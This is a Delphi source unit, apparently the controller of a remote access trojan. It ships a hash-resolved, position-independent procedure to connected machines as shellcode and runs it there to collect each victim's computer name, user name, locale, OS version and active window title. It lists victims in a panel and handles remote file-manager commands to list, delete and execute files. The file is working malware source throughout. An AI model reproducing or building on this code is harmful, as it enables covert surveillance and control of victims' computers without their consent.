unit untClientObject;

interface

uses
  System.Win.ScktComp,
  Windows,
  Sysutils,
  CLasses,
  ComCtrls,
  untUtil,
  untCommands;

type
  TClientThread = class(TObject)
  private
    procedure ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
  protected
  public
    Data:AnsiString;
    mySocket:TCustomWinsocket;
    lstItem:TListItem;
    frmControl:TObject;
    constructor Create(CreateSuspended: Boolean);
    procedure Cleanup;
    procedure ReadData;
    function SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
    procedure RequestInformation();
  end;
implementation

uses Unit1, untControl, untFilemanager, untUtils, untFlag;

procedure SendInformation(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
var
  pComputerName:array[0..100] of WideChar;
  pUserName:array[0..100] of WideChar;
  pCountry:array[0..100] of WideChar;
  pWindow:array[0..100] of WideChar;
  pFullInformations:PWideChar;
  strCMP:Array[0..20] of WideChar;
  OsVinfo: TOSVERSIONINFOA;
  dwMajor, dwMinor:Cardinal;
  xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
  xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
  xGetLocaleInfoW:function(Locale: LCID; LCType: LCTYPE; lpLCData: LPWSTR; cchData: Integer): Integer; stdcall;
  xGetVersionExA:function(var lpVersionInformation: TOSVersionInfoA): BOOL; stdcall;
  xGetWindowTextW:function(hWnd: HWND; lpString: LPWSTR; nMaxCount: Integer): Integer; stdcall;
  xGetForegroundWindow:function:HWND; stdcall;
begin
  xGetComputerNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $4E5771A7, 16);
  xGetUserNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hAdvapi32, $ADA2AFC2, 12);
  xGetLocaleInfoW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $854B387C, 14);
  xGetVersionExA := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $DF87764A, 13);
  xGetForegroundWindow := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.huser32, $5D79D927, 19);
  xGetWindowTextW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.huser32, $3324CA58, 14);
  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:='|';strCMP[9]:='%';strCMP[10]:='s';strCMP[11]:='|';strCMP[12]:='%';strCMP[13]:='d';strCMP[14]:='.';strCMP[15]:='%';strCMP[16]:='d';strCMP[17]:='|';strCMP[18]:='%';strCMP[19]:='s';strCMP[20]:=#0;

  dwLen := 100;
  xGetComputernameW(@pComputerName[0], dwLen);

  dwLen := 100;
  xGetUserNameW(@pUserName[0], dwLen);

  xGetWindowTextW(xGetForegroundWindow, @pWindow[0], 100);

  pConn.pAPI.xZeroMemory(OsVinfo, SizeOf(OsVinfo));
  OsVinfo.dwOSVersionInfoSize := SizeOf(TOSVERSIONINFOA);
  xGetVersionExA(OsVinfo);

  xGetLocaleInfoW(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME, @pCountry[0], dwLen);
  pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, 1024);
  if pFullInformations <> nil then
  begin
    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100, @pCountry[0], OsVinfo.dwMajorVersion, OsVinfo.dwMinorVersion, @pWindow[0]);
    pConn.xSendBuffer(pConn, CMD_ONLINE, pFullInformations, pConn.pAPI.xlstrlenW(pFullInformations) * 2, False);
    pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
  end;
end;
procedure SendInformation_END(); begin end;

procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
var
  lstTokens:TStringList;
  tempGUIString:String;
begin
  tempGUIString := '';
  case bCMD of
    CMD_ONLINE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        lstTokens := Explode('|', tempGUIString);
        if lstTokens.Count >= 5 then
        begin
          if not Assigned(Self.lstItem) then
          begin
            lstItem := Form1.Listview1.Items.Add;
            lstItem.Caption := mySocket.RemoteAddress;
            lstItem.ImageIndex := 0;
            lstItem.SubItems.Add(lstTokens[0]);
            lstItem.SubItems.Add(lstTokens[4]);
            lstItem.SubItems.Add(lstTokens[1]);
            lstItem.ImageIndex := GetFlag(lstTokens[2]);
            lstItem.SubItems.Objects[0] := Self;
          end;
        end else begin
          mysocket.Close;
          exit;
        end;
      end;
    CMD_DRIVE_LIST:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_START:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_WRITE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_FINISHED:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_ERROR:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_FILE_DELETE_OK:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_FILE_DELETE_FAIL:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_FILE_EXECUTE_OK:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_FILE_EXECUTE_FAIL:
      begin
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
  end;
end;

function TClientThread.SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwPacketLen := iBufferLen;
    bCommand := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := Self.mySocket.SendBuf(szSendBuffer, iBufferLen);
  if (iSendLen = iBufferLen) then
    Result := True;
  Sleep(0);
end;

procedure TClientThread.Cleanup;
begin
  if Assigned(lstItem) then
    lstItem.Delete;

  if Assigned(frmControl) then
    frmControl.Free;
end;

constructor TClientThread.Create;
begin
  mySocket := nil;
  frmControl := nil;
end;

procedure TClientThread.RequestInformation();
var
  dwProcLen:Cardinal;
  pShell:PShellCode;
begin
  dwProcLen := DWORD(@SendInformation_END) - DWORD(@SendInformation);
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 0;
    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @SendInformation, pShell.dwLen);
    SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;

  dwProcLen := 0;
  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
  if pShell <> nil then
  begin
    pShell.dwLen := dwProcLen;
    pShell.dwID := 0;
    SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
    FreeMem(pShell);
  end;
end;

procedure TClientThread.ReadData();
var
  DataSize, dwBuffLen: Cardinal;
  mData:AnsiString;
  bByte:Byte;
  pSocketHeader:LPSocketHeader;
begin
  if mySocket = nil then exit;
  if mySocket.Data = nil then exit;

  if Data = '' then exit;
  pSocketHeader := @Data[1];
  DataSize := pSocketHeader.dwPacketLen;
  bByte := pSocketHeader.bCommand;
  dwBuffLen := Length(Data) - SizeOf(TSocketHeader);
  if DataSize > dwBuffLen then exit;
  Delete(Data,1, SizeOf(TSocketHeader));
  mData := Copy(Data,1,DataSize);
  Delete(Data,1, DataSize);
  ParsePacket(@mData[1], DataSize, bByte);
  if Length(Data) > 0 then begin
    ReadData;
  end;
end;
end.
